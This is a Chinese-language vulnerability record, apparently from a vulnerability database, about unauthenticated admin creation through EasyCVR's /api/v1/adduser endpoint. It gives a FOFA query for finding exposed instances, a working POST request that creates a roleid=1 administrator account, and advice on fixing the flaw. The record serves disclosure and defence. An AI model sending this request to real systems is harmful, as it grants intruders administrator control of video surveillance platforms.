---
schema_version: "1"
id: "VW-20261013-CG054"
title: "EasyCVR adduser 未授权添加用户"
product: "EasyCVR"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "source-claimed"
content_status: "active"
prerequisites: "EasyCVR 视频管理平台；无需认证"
side_effects: "未授权可添加管理员；测试须限定授权环境"
source: "北雪网络安全；wxvl"
source_status: "recorded"
source_url: "https://pc.fenchuan8.com/#/index?forum=110296"
---

# EasyCVR adduser 未授权添加用户

## 漏洞描述

EasyCVR 视频管理平台的 `/api/v1/adduser` 接口未授权可直接添加管理员用户。无需认证，POST 指定参数即创建 roleid=1 的管理员账号。

FOFA：`title="EasyCVR"`

## 影响版本

- 受影响：EasyCVR 视频管理平台
- 修复版本：升级至安全版本

## 漏洞复现

```
POST /api/v1/adduser HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=admin&username=admin&password=0e7517141fb53f21ee439b355b5a1d0a&roleid=1
```

## 漏洞修复

关闭互联网暴露面；升级至安全版本。

## 参考

- 北雪网络安全（2026-10-06）

> 仅限授权测试。
